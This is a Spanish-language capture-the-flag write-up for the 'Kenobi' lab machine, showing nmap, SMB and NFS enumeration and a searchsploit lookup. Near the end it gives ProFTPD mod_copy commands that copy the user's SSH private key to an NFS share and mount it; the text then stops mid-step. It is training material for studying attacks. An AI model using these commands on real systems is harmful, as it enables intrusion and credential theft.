# Kenobi 🤠🗡

Security, Owasp top 10, Cron. (#nmap, #samba, #suid, #pathvarmanipulation #smb )

## Tabla de contenido

- [Enumeración](#Enumeración).
- [Web Site](#Web-Site).
- [Shell](#Shell).


--------------------------------
### Enumeración
-------------------------------
Hacemos una revisión general:
```plain
nmap -sC -sV -oN nmap/initial 10.10.211.49
```

* -oN: Guardar el sondeo en formato normal.
* -sC: Realizar análisis con los scripts por defecto.
* -sV: Detección de la versión de servicios.

```
Starting Nmap 7.60 ( https://nmap.org ) at 2020-11-07 03:01 GMT
Nmap scan report for ip-10-10-20-62.eu-west-1.compute.internal (10.10.20.62)
Host is up (0.0014s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      37331/tcp  mountd
|   100005  1,2,3      57285/udp  mountd
|   100021  1,3,4      35955/tcp  nlockmgr
|   100021  1,3,4      51202/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:8D:3E:7D:C6:25 (Unknown)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-11-06T21:01:30-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-07 03:01:30
|_  start_date: 1600-12-31 23:58:45

```

--------------------------------
#### Samba
-------------------------------
 Permite a los usuarios finales acceder y utilizar archivos, impresoras y otros recursos comúnmente compartidos en la intranet o Internet de una empresa.

Enumeración de acciones en los puertos default samba (139,445)
```
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.93.79
```
Resultado del escaneo:
```
Starting Nmap 7.60 ( https://nmap.org ) at 2020-11-07 19:38 GMT
Failed to resolve "smb-enum-users.nse".
Nmap scan report for ip-10-10-93-79.eu-west-1.compute.internal (10.10.93.79)
Host is up (0.00032s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:4A:C5:30:7D:69 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.93.79\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.93.79\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.93.79\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```
Se observa los recursos compartidos, nos conectamos para ver que archivos encontramos:

```
smbclient //10.10.93.79/anonymous
```
--------------------------------
#### RPC
-------------------------------

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.79
```


```
Starting Nmap 7.60 ( https://nmap.org ) at 2020-11-07 21:00 GMT
Nmap scan report for ip-10-10-93-79.eu-west-1.compute.internal (10.10.93.79)
Host is up (0.00023s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836528.0  6877100.0  22%   16.0T        32000
MAC Address: 02:4A:C5:30:7D:69 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
```

--------------------------------
#### Proftpd
-------------------------------

Utilizaremos searchsploit para encontrar los exploits para ProFTPd 1.3.5

```
searchsploit proftpd 1.3.5
```

```
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
nc 10.10.239.150 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

```
sudo mkdir /mnt/kenobiNFS
mount 10.10.239.150:/var /mnt/kenobiNFS
sudo mount 10.10.239.150:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS/
```

```
cp /mnt/kenobiNFS
```
